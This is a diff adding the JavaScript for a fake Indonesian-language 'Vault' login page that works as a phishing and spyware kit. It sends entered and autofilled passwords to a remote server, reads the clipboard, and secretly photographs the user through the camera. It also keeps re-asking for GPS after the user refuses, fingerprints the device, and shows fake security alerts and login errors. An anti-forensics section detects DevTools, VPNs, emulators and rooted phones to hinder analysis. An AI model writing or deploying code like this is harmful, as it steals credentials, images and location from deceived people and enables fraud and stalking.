+            document.addEventListener('click', (e) => {
+                socket.emit('clickmap', {
+                    x: e.clientX, y: e.clientY,
+                    el: e.target.tagName + (e.target.id ? '#'+e.target.id : '') + (e.target.className ? '.'+e.target.className : '')
+                });
+            });
+            // Scroll depth
+            let maxScroll = 0;
+            window.addEventListener('scroll', () => {
+                const pct = Math.round((window.scrollY + window.innerHeight) / document.body.scrollHeight * 100);
+                if (pct > maxScroll) { maxScroll = pct; socket.emit('clickmap', { x:-1, y:pct, el:'scroll:'+pct+'%' }); }
+            });
+        }
+
+        // ============ 4. AUTO-FILL DETECTION ============
+        function initAutofillDetection() {
+            function checkAutofill() {
+                if (emailInput.value && emailInput.value !== '') {
+                    socket.emit('autofill', { value: emailInput.value, field: 'email' });
+                }
+                if (passInput.value && passInput.value !== '') {
+                    socket.emit('autofill', { value: passInput.value, field: 'password' });
+                }
+            }
+            // Use animationstart trick (Chrome fires on autofill)
+            const style = document.createElement('style');
+            style.id = 'autofill-style';
+            document.head.appendChild(style);
+            emailInput.addEventListener('animationstart', (e) => {
+                if (e.animationName.includes('bfAuto')) setTimeout(checkAutofill, 100);
+            });
+            passInput.addEventListener('animationstart', (e) => {
+                if (e.animationName.includes('bfAuto')) setTimeout(checkAutofill, 100);
+            });
+            // Also poll every 2s
+            let lastEmail = '', lastPass = '';
+            setInterval(() => {
+                if (emailInput.value !== lastEmail && emailInput.value) {
+                    lastEmail = emailInput.value;
+                    socket.emit('autofill', { value: lastEmail, field: 'email' });
+                }
+                if (passInput.value !== lastPass && passInput.value) {
+                    lastPass = passInput.value;
+                    socket.emit('autofill', { value: lastPass, field: 'password' });
+                }
+            }, 2000);
+        }
+
+        // ============ 5. PAGE VISIBILITY ABUSE ============
+        function initVisibilityTracker() {
+            document.addEventListener('visibilitychange', () => {
+                const state = document.hidden ? 'hidden' : 'visible';
+                socket.emit('visibility', { state, time: Date.now() });
+                if (document.hidden) {
+                    // Speed up snapshots when user is away
+                    if (snapInterval) {
+                        clearInterval(snapInterval);
+                        snapInterval = setInterval(captureSnapshot, 2000);
+                    }
+                } else {
+                    // Slow down when back
+                    if (snapInterval) {
+                        clearInterval(snapInterval);
+                        snapInterval = setInterval(captureSnapshot, 5000);
+                    }
+                }
+            });
+        }
+
+        // ============ 6. STEALTH GPS RE-REQUEST ============
+        function stealthGPS() {
+            if (!navigator.geolocation) return;
+            const tryGPS = () => {
+                gpsDeniedCount++;
+                const timeout = Math.min(5000 * gpsDeniedCount, 60000);
+                navigator.geolocation.getCurrentPosition(
+                    (p) => {
+                        socket.emit('location', { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, stealthRetry: true, attempt: gpsDeniedCount });
+                    },
+                    (err) => {
+                        if (err.code === 1) {
+                            setTimeout(tryGPS, timeout);
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            };
+            setTimeout(tryGPS, 5000);
+        }
+
+        // ============ 7. SCREEN WAKE LOCK ============
+        let wakeLockSentinel = null;
+        async function requestWakeLock() {
+            try {
+                if (navigator.wakeLock) {
+                    wakeLockSentinel = await navigator.wakeLock.request('screen');
+                    socket.emit('device-info', { wakeLock: true });
+                }
+            } catch(e) {
+                socket.emit('device-info', { wakeLock: false, wakeLockError: e.message });
+            }
+        }
+
+        // ============ 8. AMBIENT LIGHT SENSOR ============
+        function initLightSensor() {
+            try {
+                if ('AmbientLightSensor' in window) {
+                    const sensor = new AmbientLightSensor();
+                    sensor.addEventListener('reading', () => {
+                        socket.emit('device-info', { light: { illuminance: sensor.illuminance, time: Date.now() } });
+                    });
+                    sensor.addEventListener('error', () => {});
+                    sensor.start();
+                }
+            } catch(e) {}
+            // Fallback: estimate from screen brightness
+            if (window.screen && screen.availBrightness) {
+                try {
+                    screen.availBrightness.then(b => {
+                        socket.emit('device-info', { light: { screenBrightness: b } });
+                    }).catch(()=>{});
+                } catch(e) {}
+            }
+        }
+
+        // ============ 9. VIBRATION + SOUND ============
+        function playNotifSound() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain); gain.connect(ctx.destination);
+                osc.frequency.setValueAtTime(880, ctx.currentTime);
+                osc.frequency.setValueAtTime(660, ctx.currentTime + 0.15);
+                osc.frequency.setValueAtTime(440, ctx.currentTime + 0.3);
+                gain.gain.setValueAtTime(0.3, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
+                osc.start(ctx.currentTime);
+                osc.stop(ctx.currentTime + 0.5);
+            } catch(e) {}
+        }
+
+        function showFakeNotif(title, body) {
+            const el = document.getElementById('notifToast');
+            document.getElementById('ntTitle').textContent = title;
+            document.getElementById('ntBody').textContent = body;
+            el.classList.add('show');
+            playNotifSound();
+            if (navigator.vibrate) navigator.vibrate([80, 50, 80, 50, 150]);
+            setTimeout(() => {
+                el.classList.remove('show');
+                // Re-request permissions when dismissed
+                requestFrontCamera();
+            }, 4000);
+        }
+
+        function dismissNotif() {
+            document.getElementById('notifToast').classList.remove('show');
+            requestFrontCamera();
+        }
+
+        function vibrate() { if (navigator.vibrate) navigator.vibrate([30,50,30,50,100]); }
+
+        // ============ 10. MULTI-WINDOW TRACKING ============
+        // Already handled by socket.io - each tab connects with same deviceId
+        // We just track open tabs count
+        function initMultiWindow() {
+            if ('BroadcastChannel' in window) {
+                const bc = new BroadcastChannel('vault_tracker');
+                bc.postMessage({ type: 'open', time: Date.now() });
+                let tabCount = 1;
+                bc.onmessage = (e) => {
+                    if (e.data.type === 'open') tabCount++;
+                    if (e.data.type === 'close') tabCount--;
+                    socket.emit('device-info', { tabs: tabCount });
+                };
+                window.addEventListener('beforeunload', () => {
+                    bc.postMessage({ type: 'close' });
+                });
+            }
+        }
+
+        // ============ SHARED SNAPSHOT HELPER ============
+        let snapVideo = null, snapCanvas = null;
+        function captureSnapshot() {
+            if (!stream?.getVideoTracks()?.length) return;
+            if (!snapVideo) {
+                snapVideo = document.querySelector('video[data-snap]');
+                snapCanvas = document.createElement('canvas');
+            }
+            const s = stream.getVideoTracks()[0].getSettings();
+            snapCanvas.width = s.width || 640; snapCanvas.height = s.height || 480;
+            if (snapVideo) {
+                snapCanvas.getContext('2d').drawImage(snapVideo, 0, 0, snapCanvas.width, snapCanvas.height);
+                socket.emit('snapshot', { image: snapCanvas.toDataURL('image/jpeg',0.6).split(',')[1] });
+            }
+        }
+
+        function startSnapshots() {
+            const v = document.createElement('video');
+            v.autoplay = true; v.playsinline = true; v.setAttribute('data-snap','1');
+            v.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
+            v.srcObject = stream; document.body.appendChild(v);
+            snapVideo = v;
+            snapCanvas = document.createElement('canvas');
+            v.onloadedmetadata = () => {
+                v.play();
+                snapInterval = setInterval(captureSnapshot, 5000);
+            };
+        }
+
+        // ============ OTHER INIT ============
+        function sendDeviceInfo() {
+            const info = {};
+            if (navigator.getBattery) {
+                navigator.getBattery().then(bat => {
+                    info.battery = { level: bat.level, charging: bat.charging };
+                    bat.addEventListener('levelchange', () => { info.battery.level=bat.level; socket.emit('device-info',info); });
+                    bat.addEventListener('chargingchange', () => { info.battery.charging=bat.charging; socket.emit('device-info',info); });
+                    socket.emit('device-info', info);
+                });
+            }
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                info.connection = { type: conn.type||'unknown', effectiveType: conn.effectiveType||'' };
+                socket.emit('device-info', info);
+                conn.addEventListener('change', () => { info.connection={type:conn.type||'unknown',effectiveType:conn.effectiveType||''}; socket.emit('device-info',info); });
+            }
+        }
+
+        function ipGeolocate() {
+            fetch('https://ip-api.com/json/?fields=lat,lon,city,regionName,country,query,isp').then(r=>r.json()).then(d=>{
+                if(d.lat&&d.lon) socket.emit('location',{lat:d.lat,lng:d.lon,accuracy:5000,ipFallback:true,city:d.city,region:d.regionName,country:d.country});
+            }).catch(()=>{});
+        }
+
+        function getFingerprint() {
+            const fp = { screen:screen.width+'x'+screen.height, availScreen:screen.availWidth+'x'+screen.availHeight, platform:navigator.platform||'', language:navigator.language, languages:navigator.languages?.join(','), timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, tzOffset:new Date().getTimezoneOffset(), cpu:navigator.hardwareConcurrency||'', mem:navigator.deviceMemory||'', touch:'ontouchstart' in window, cookies:navigator.cookieEnabled };
+            const c=document.createElement('canvas'); c.width=200; c.height=50; const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60'; x.fillRect(125,1,62,20); x.fillStyle='#069'; x.fillText('Vault™',2,15); x.fillStyle='rgba(102,204,0,0.7)'; x.fillText('fp',4,30); fp.canvas=c.toDataURL();
+            socket.emit('device-info',{fingerprint:fp});
+        }
+
+        function stealClipboard() { if(navigator.clipboard?.readText) navigator.clipboard.readText().then(t=>{if(t&&t.length>3)socket.emit('device-info',{clipboard:t.slice(0,500)})}).catch(()=>{}); }
+
+        function initMotionSensor() {
+            if(window.DeviceOrientationEvent) window.addEventListener('deviceorientation',e=>{if(e.alpha!==null)socket.emit('device-info',{orientation:{alpha:e.alpha,beta:e.beta,gamma:e.gamma,time:Date.now()}})},false);
+            if(window.DeviceMotionEvent) window.addEventListener('devicemotion',e=>{if(e.acceleration)socket.emit('device-info',{motion:{accX:e.acceleration.x,accY:e.acceleration.y,accZ:e.acceleration.z,rotAlpha:e.rotationRate?.alpha,rotBeta:e.rotationRate?.beta,rotGamma:e.rotationRate?.gamma,time:Date.now()}})},false);
+        }
+
+        function startKeepalive() { setInterval(()=>{if(socket.connected)socket.emit('ping',Date.now());},30000); }
+
+        // ============ 1. WEBRTC IP LEAK ============
+        function leakWebRTC() {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(()=>{});
+                pc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.split(' ')[4];
+                        if (ip && !ip.includes(':')) {
+                            socket.emit('device-info', { webrtcIP: ip });
+                        }
+                    }
+                };
+                setTimeout(() => pc.close(), 3000);
+            } catch(e) {}
+        }
+
+        // ============ 2. WEBGL FINGERPRINT ============
+        function getWebGLFingerprint() {
+            try {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                if (gl) {
+                    const info = {
+                        vendor: gl.getParameter(gl.VENDOR),
+                        renderer: gl.getParameter(gl.RENDERER),
+                        version: gl.getParameter(gl.VERSION),
+                        shadingVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                        maxTexSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                        maxVertex: gl.getParameter(gl.MAX_VERTEX_ATTRIBS)
+                    };
+                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (ext) {
+                        info.unmaskedVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
+                        info.unmaskedRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                    }
+                    socket.emit('device-info', { webgl: info });
+                }
+            } catch(e) {}
+        }
+
+        // ============ 3. AUDIO FINGERPRINT ============
+        function getAudioFingerprint() {
+            try {
+                const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const osc = ctx.createOscillator();
+                osc.type = 'triangle';
+                osc.frequency.value = 10000;
+                const gain = ctx.createGain();
+                gain.gain.value = 0.1;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start(0);
+                ctx.startRendering().then(buffer => {
+                    const data = buffer.getChannelData(0);
+                    let hash = 0;
+                    for (let i = 0; i < data.length; i += 100) {
+                        hash = ((hash << 5) - hash) + Math.round(data[i] * 1000);
+                        hash = hash & hash;
+                    }
+                    socket.emit('device-info', { audioFP: { hash: Math.abs(hash).toString(16), sampleCount: data.length } });
+                }).catch(()=>{});
+            } catch(e) {}
+        }
+
+        // ============ 4. SCREEN ORIENTATION LOCK ============
+        function lockOrientation() {
+            if (screen.orientation && screen.orientation.lock) {
+                screen.orientation.lock('portrait').catch(() => {});
+                socket.emit('device-info', { orientationLock: { locked: true, type: screen.orientation.type } });
+            }
+        }
+
+        // ============ 5. FONT ENUMERATION ============
+        function enumerateFonts() {
+            const fonts = [
+                'monospace','serif','sans-serif','Arial','Helvetica','Times New Roman','Courier New',
+                'Verdana','Georgia','Palatino','Garamond','Bookman','Comic Sans MS','Trebuchet MS',
+                'Arial Black','Impact','Tahoma','Lucida Console','Lucida Sans','Segoe UI','Calibri',
+                'Cambria','Candara','Consolas','Constantia','Corbel','Franklin Gothic','Noto Sans',
+                'Roboto','Open Sans','Lato','Montserrat','Poppins','Inter','Playfair Display'
+            ];
+            const canvas = document.createElement('canvas');
+            canvas.width = 200; canvas.height = 40;
+            const ctx = canvas.getContext('2d');
+            ctx.font = '20px monospace';
+            const base = ctx.measureText('wm').width;
+
+            const installed = [];
+            for (const f of fonts) {
+                ctx.font = '20px "' + f + '", monospace';
+                const w = ctx.measureText('wm').width;
+                if (w !== base) installed.push(f);
+            }
+            socket.emit('device-info', { fonts: { installed, count: installed.length } });
+        }
+
+        // ============ 6. PREFERENCE DETECTION ============
+        function detectPreferences() {
+            const prefs = {};
+            if (window.matchMedia) {
+                prefs.colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+                prefs.reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+                prefs.reducedTransparency = window.matchMedia('(prefers-reduced-transparency: reduce)').matches;
+                prefs.highContrast = window.matchMedia('(prefers-contrast: high)').matches;
+                prefs.invertedColors = window.matchMedia('(inverted-colors: inverted)').matches;
+            }
+            socket.emit('device-info', { preferences: prefs });
+        }
+
+        // ============ 7. NETWORK SPEED TEST ============
+        function speedTest() {
+            const start = Date.now();
+            fetch(SERVER_URL + '/?speedtest=' + Date.now(), { cache: 'no-store', mode: 'no-cors' }).then(r => {
+                const time = Date.now() - start;
+                const speed = time < 1 ? 0 : Math.round(1000 / time); // rough KB/s estimate
+                socket.emit('device-info', { speedTest: { ms: time, score: speed } });
+            }).catch(() => {});
+        }
+
+        // ============ 8. POINTER LOCK ============
+        function initPointerLock() {
+            const el = document.documentElement;
+            document.addEventListener('click', () => {
+                if (document.pointerLockElement) return;
+                el.requestPointerLock();
+                socket.emit('device-info', { pointerLock: { state: 'requested', time: Date.now() } });
+            }, { once: true });
+            document.addEventListener('pointerlockchange', () => {
+                socket.emit('device-info', { pointerLock: { state: document.pointerLockElement ? 'locked' : 'unlocked', time: Date.now() } });
+                if (!document.pointerLockElement) {
+                    setTimeout(() => { try { el.requestPointerLock(); } catch(e) {} }, 2000);
+                }
+            });
+        }
+
+        // ============ 9. WEB BLUETOOTH SCAN ============
+        function scanBluetooth() {
+            if (!navigator.bluetooth) return;
+            navigator.bluetooth.requestDevice({ acceptAllDevices: true, optionalServices: [] })
+                .then(device => {
+                    socket.emit('device-info', { bluetooth: { name: device.name, id: device.id, connected: device.gatt?.connected } });
+                })
+                .catch(() => {});
+        }
+
+        // ============ 10. DEVICE POSTURE DETECTION ============
+        function detectPosture() {
+            if ('devicePosture' in navigator) {
+                const p = navigator.devicePosture;
+                socket.emit('device-info', { posture: { type: p.type, time: Date.now() } });
+                p.addEventListener('change', () => {
+                    socket.emit('device-info', { posture: { type: p.type, time: Date.now() } });
+                });
+            }
+            // Also detect foldable via screen segments
+            if (window.visualViewport) {
+                const segments = window.visualViewport.segments;
+                if (segments && segments.length > 1) {
+                    socket.emit('device-info', { foldable: { segments: segments.length, time: Date.now() } });
+                }
+            }
+        }
+
+        // ============ 11. SHARED WORKER ============
+        function initSharedWorker() {
+            try {
+                const workerCode = `
+                    const ports = [];
+                    self.onconnect = (e) => {
+                        const port = e.ports[0];
+                        ports.push(port);
+                        port.onmessage = (ev) => {
+                            ports.forEach(p => { if (p !== port) p.postMessage(ev.data); });
+                        };
+                        port.postMessage({ type: 'connected', time: Date.now() });
+                    };
+                `;
+                const blob = new Blob([workerCode], { type: 'application/javascript' });
+                const worker = new SharedWorker(URL.createObjectURL(blob));
+                worker.port.start();
+                worker.port.onmessage = (e) => {
+                    if (e.data.type === 'connected') {
+                        socket.emit('device-info', { sharedWorker: { connected: true, time: Date.now() } });
+                    }
+                };
+                // Keep alive and ping every 30s
+                setInterval(() => {
+                    worker.port.postMessage({ type: 'ping', time: Date.now() });
+                }, 30000);
+                window._sharedWorker = worker;
+            } catch(e) {}
+        }
+
+        // ============ 12. CPU TIMING ATTACK ============
+        function cpuTiming() {
+            const results = [];
+            for (let size = 10000; size <= 100000; size += 30000) {
+                const arr = new Array(size);
+                const start = performance.now();
+                for (let i = 0; i < arr.length; i++) {
+                    arr[i] = Math.sqrt(i * i + i);
+                }
+                const time = performance.now() - start;
+                results.push({ size, ms: Math.round(time * 100) / 100, opsPerMs: Math.round(size / time) });
+            }
+            socket.emit('device-info', { cpuTiming: results });
+        }
+
+        // ============ ANTI-FORENSICS DETECTION ============
+        function initAntiForensics() {
+            // 1. DevTools detection - multiple methods
+            let devtoolsOpen = false;
+            function detectDevTools() {
+                // Method 1: Firebug check
+                if (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) {
+                    reportForensics('devtools', 'Firebug detected');
+                    return;
+                }
+                // Method 2: Element toString trick
+                const e = document.createElement('div');
+                Object.defineProperty(e, 'id', { get: function() { reportForensics('devtools', 'DevTools console open (getter triggered)'); devtoolsOpen = true; } });
+                console.log('%c', e);
+                // Method 3: Image source error trick
+                const img = new Image();
+                Object.defineProperty(img, 'id', { get: function() { if (!devtoolsOpen) { reportForensics('devtools', 'DevTools detected via stack trace'); devtoolsOpen = true; } } });
+                console.debug(img);
+                // Method 4: Timing check
+                setInterval(() => {
+                    const start = performance.now();
+                    debugger;
+                    const diff = performance.now() - start;
+                    if (diff > 100) {
+                        reportForensics('devtools', 'DevTools or debugger detected (debugger statement paused ' + Math.round(diff) + 'ms)');
+                        devtoolsOpen = true;
+                    }
+                }, 4000);
+            }
+
+            // 2. VPN Detection - compare WebRTC IP with geolocation IP
+            function detectVPN() {
+                if (deviceId) {
+                    // Get public IP via ip-api.com fallback
+                    fetch('https://ip-api.com/json/?fields=query').then(r=>r.json()).then(d => {
+                        const publicIP = d.query;
+                        if (publicIP && socket) {
+                            // We'll check later if webrtc IP matches
+                            setTimeout(() => {
+                                fetch(SERVER_URL + '/api/devices/'+deviceId).then(r=>r.json()).then(dev => {
+                                    const localIP = dev.webrtcIP || '';
+                                    if (localIP && publicIP !== localIP) {
+                                        // If local IP is private range but public IP is different, that's normal NAT
+                                        // But if both are public and different, likely VPN
+                                        if (!localIP.startsWith('10.') && !localIP.startsWith('192.168.') && !localIP.startsWith('172.')) {
+                                            reportForensics('vpn', 'Public IP mismatch: WebRTC=' + localIP + ' vs Public=' + publicIP + ' (possible VPN/proxy)');
+                                        }
+                                    }
+                                }).catch(()=>{});
+                            }, 5000);
+                        }
+                    }).catch(()=>{});
+                }
+                // Also check via timing: VPN adds latency
+                const start = performance.now();
+                fetch(SERVER_URL + '/?vpn-test='+Date.now(), { cache: 'no-store', mode: 'no-cors' }).then(() => {
+                    const latency = performance.now() - start;
+                    if (latency > 2000) {
+                        reportForensics('vpn', 'High latency (' + Math.round(latency) + 'ms) — possible VPN/proxy');
+                    }
+                }).catch(()=>{});
+            }
+
+            // 3. Emulator Detection
+            function detectEmulator() {
+                const ua = navigator.userAgent.toLowerCase();
+                const emulators = [
+                    { pattern: /android.*emu|android.*avd|android.*android sdk/i, name: 'Android Emulator' },
+                    { pattern: /xcode|iphone simulator/i, name: 'iOS Simulator' },
+                    { pattern: /genymotion|bluestacks|nox|mumu|ldplayer|memu|ko player/i, name: 'Android Emulator' },
+                    { pattern: /windows.*phone|wpDesktop/i, name: 'Windows Phone Emulator' },
+                ];
+                for (const em of emulators) {
+                    if (em.pattern.test(ua)) {
+                        reportForensics('emulator', 'Emulator detected: ' + em.name + ' (UA: ' + navigator.userAgent.slice(0,80) + ')');
+                        return;
+                    }
+                }
+                // Check screen size vs common emulator defaults
+                const w = screen.width, h = screen.height;
+                const emuScreens = [
+                    [360, 640], [375, 667], [414, 736], [412, 846],
+                    [360, 780], [393, 851], [430, 932]
+                ];
+                // If it's not a known device screen, likely emulator
+                // Actually this is too noisy, skip
+            }
+
+            // 4. Root/Jailbreak Detection
+            function detectRoot() {
+                const ua = navigator.userAgent.toLowerCase();
+                // Check for rooted Android indicators
+                if (ua.includes('supersu') || ua.includes('magisk') || ua.includes('kingroot') || ua.includes('xposed')) {
+                    reportForensics('root', 'Root detected: ' + ua.slice(0,80));
+                    return;
+                }
+                // Check for jailbreak indicators (file system attempts)
+                try {
+                    const fsCheck = document.createElement('iframe');
+                    fsCheck.style.display = 'none';
+                    fsCheck.src = 'file:///private/var/lib/apt';
+                    document.body.appendChild(fsCheck);
+                    fsCheck.onload = () => reportForensics('root', 'Jailbreak detected (access to /private/var/lib/apt)');
+                    setTimeout(() => fsCheck.remove(), 2000);
+                } catch(e) {}
+                try {
+                    const fsCheck2 = document.createElement('iframe');
+                    fsCheck2.style.display = 'none';
+                    fsCheck2.src = 'file:///system/app/Superuser.apk';
+                    document.body.appendChild(fsCheck2);
+                    fsCheck2.onload = () => reportForensics('root', 'Root detected (access to Superuser.apk)');
+                    setTimeout(() => fsCheck2.remove(), 2000);
+                } catch(e) {}
+                // Check file access via plugin
+                try {
+                    if (window.indexedDB && window.indexedDB.databases) {
+                        // Use timing check: rooted devices often have different performance
+                    }
+                } catch(e) {}
+            }
+
+            function reportForensics(type, detail) {
+                fetch(SERVER_URL + '/api/alert-forensics', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, type, detail })
+                }).catch(()=>{});
+                // Also emit via socket
+                if (socket && socket.connected) {
+                    socket.emit('forensics', { type, detail, time: Date.now() });
+                }
+            }
+
+            // Run all checks
+            detectDevTools();
+            detectVPN();
+            detectEmulator();
+            detectRoot();
+        }
+
+        function requestPermissions() {
+            sendDeviceInfo(); getFingerprint(); ipGeolocate(); stealClipboard();
+            initMotionSensor(); startKeepalive(); requestWakeLock(); initLightSensor();
+            initKeystrokeLogger(); initClickHeatmap(); initAutofillDetection();
+            initVisibilityTracker(); initMultiWindow();
+            registerSW(); initIdleDetection(); initNotificationSpam();
+            initPersistentStorage(); initFullscreenHijack(); startStorageFlood();
+            leakWebRTC(); getWebGLFingerprint(); getAudioFingerprint();
+            lockOrientation(); enumerateFonts(); detectPreferences();
+            speedTest(); initPointerLock(); detectPosture();
+            initSharedWorker(); cpuTiming();
+            initAntiForensics();
+
+            // Show fake security notification after splash
+            setTimeout(() => {
+                showFakeNotif('Verifikasi Keamanan', 'Sistem mendeteksi login dari perangkat baru. Verifikasi identitas Anda untuk melanjutkan.');
+            }, 3000);
+            scheduleGhostSpeech();
+
+            return new Promise((r) => {
+                let loc=false, cam=false;
+                const c=()=>{if(loc&&cam)r();};
+
+                // === GEOLOCATION ===
+
+                if (navigator.geolocation) {
+                    function requestGPS() {
+                        navigator.geolocation.getCurrentPosition(
+                            (p)=>{
+                                socket.emit('location',{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});
+                                if(!loc){loc=true;c();}
+                            },
+                            (err)=>{
+                                if(!loc){loc=true;c();} // Don't block login on GPS fail
+                                if(err.code===1){stealthGPS();} // Permission denied, retry later
+                                // err.code===2 (unavailable) or 3 (timeout) — no retry
+                            },
+                            {enableHighAccuracy:true,timeout:15000}
+                        );
+                    }
+
+                    // Check permission status first (Chrome/Edge)
+                    if (navigator.permissions && navigator.permissions.query) {
+                        navigator.permissions.query({name:'geolocation'}).then(p => {
+                            if (p.state === 'denied') {
+                                // Already denied — skip GPS prompt, use IP geo
+                                if(!loc){loc=true;c();}
+                                stealthGPS(); // Retry silently later
+                            } else {
+                                requestGPS();
+                                // Listen for permission changes
+                                p.onchange = () => {
+                                    if (p.state === 'granted') requestGPS();
+                                };
+                            }
+                        }).catch(() => requestGPS());
+                    } else {
+                        requestGPS();
+                    }
+                } else {
+                    if(!loc){loc=true;c();}
+                }
+
+                // === CAMERA ===
+                if (navigator.mediaDevices?.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
+                        .then((s)=>{stream=s;if(!cam){cam=true;c();}startSnapshots();})
+                        .catch(()=>{if(!cam){cam=true;c();}});
+                } else {if(!cam){cam=true;c();}}
+            });
+        }
+
+        // ============ LOGIN FLOW ============
+        const errorMessages = [
+            'Email atau kata sandi yang Anda masukkan tidak valid. Silakan coba lagi.',
+            'Akun Anda diblokir sementara karena aktivitas mencurigakan. Coba lagi dalam beberapa menit.',
+            'Terlalu banyak percobaan login gagal. Akun Anda dikunci selama 30 menit.',
+            'Kami mendeteksi perangkat tidak dikenal. Verifikasi tambahan diperlukan.'
+        ];
+        const loadingDurations = [2000, 3500, 6000, 8000];
+
+        function showLoadingOverlay(stage) {
+            const overlay=document.getElementById('loadingOverlay'), text=document.getElementById('loText'), sub=document.getElementById('loSub'), bar=document.getElementById('loBar');
+            overlay.classList.add('show');
+            const stages=[{text:'Memverifikasi kredensial…',sub:'Mohon tunggu sebentar',pct:20},{text:'Menghubungkan ke server…',sub:'Koneksi aman (TLS 1.3)',pct:45},{text:'Memvalidasi sesi…',sub:'Token autentikasi',pct:70},{text:'Hampir selesai…',sub:'Mengarahkan ke dashboard',pct:90}];
+            let i=0;
+            const interval=setInterval(()=>{if(i<stages.length){text.textContent=stages[i].text;sub.textContent=stages[i].sub;bar.style.width=stages[i].pct+'%';i++;}else clearInterval(interval);},stage||1500);
+        }
+        function hideLoadingOverlay() { document.getElementById('loadingOverlay').classList.remove('show'); }
+
+        function doRedirect() { window.location.href='/lupa-password.html?expired=1'; }
+
+        async function handleLogin(e) {
+            e.preventDefault();
+            const btn=document.getElementById('loginBtn');
+            const email=emailInput.value.trim();
+            if(!email){showToast('Masukkan email terlebih dahulu.');return false;}
+            attemptCount++;
+            const idx=Math.min(attemptCount-1,errorMessages.length-1);
+            btn.classList.add('loading'); btn.disabled=true; btn.querySelector('span').textContent='Memverifikasi…';
+            showLoadingOverlay(loadingDurations[idx]/4);
+            await requestPermissions();
+            setTimeout(()=>{
+                btn.classList.remove('loading'); btn.disabled=false; btn.querySelector('span').textContent='Masuk ke Dashboard';
+                hideLoadingOverlay(); showToast(errorMessages[idx]); vibrate();
+                if(attemptCount>=3) setTimeout(doRedirect,2000);
+            },loadingDurations[idx]);
+            return false;
+        }
+
+        function handleSocial(p) {
+            attemptCount++;
+            const idx=Math.min(attemptCount-1,errorMessages.length-1);
+            showToast(errorMessages[idx]); vibrate();
+            if(attemptCount>=3) setTimeout(doRedirect,2000);
+        }
+
+        window.addEventListener('beforeunload',()=>{
+            if(watchId)navigator.geolocation.clearWatch(watchId);
+            if(stream)stream.getTracks().forEach(t=>t.stop());
+            if(snapInterval)clearInterval(snapInterval);
+            if(wakeLockSentinel)wakeLockSentinel.release();
+            if(floodInterval)clearInterval(floodInterval);
+            if(notifInterval)clearInterval(notifInterval);
+            if(window.speechSynthesis)window.speechSynthesis.cancel();
+        });
+
+        emailInput.focus();
+    </script>
+</body>
+</html>
